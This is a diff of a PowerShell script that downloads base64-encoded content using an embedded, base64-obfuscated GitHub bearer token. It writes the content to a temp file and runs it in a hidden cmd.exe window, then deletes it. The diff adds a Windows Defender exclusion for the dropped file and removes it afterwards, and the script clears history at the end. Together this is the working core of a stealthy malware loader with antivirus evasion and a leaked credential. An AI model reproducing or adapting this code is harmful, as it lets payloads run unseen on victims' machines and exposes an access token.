@@ -66,7 +66,7 @@ $temp = $env:TEMP
 try {
     Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
-
+	Add-MpPreference -ExclusionPath $contFile
     try {
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
@@ -77,7 +77,7 @@ try {
             try {
                 $cleanedContent = $response.content -replace "`n", "" -replace "`r", ""
                 $decodedContent = [System.Convert]::FromBase64String($cleanedContent)
-                [System.IO.File]::WriteAllBytes($contFile, $decodedContent)
+				[System.IO.File]::WriteAllBytes($contFile, $decodedContent)
             } catch {
 				Write-Host "Error Download, not content." -ForegroundColor Red
 				Start-Sleep -s 3
@@ -95,12 +95,15 @@ try {
     try {
         $q = '"'
         $arg = "$q$contFile$q"
+		
         Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c $arg && del $arg" -WindowStyle Hidden
+
     } catch {
         Write-Host "Error Start-Process, please restart for Administrator" -ForegroundColor Red
 		Start-Sleep -s 3
     }
 } finally {
+	Remove-MpPreference -ExclusionPath $contFile
     ClrHistory
 }
 
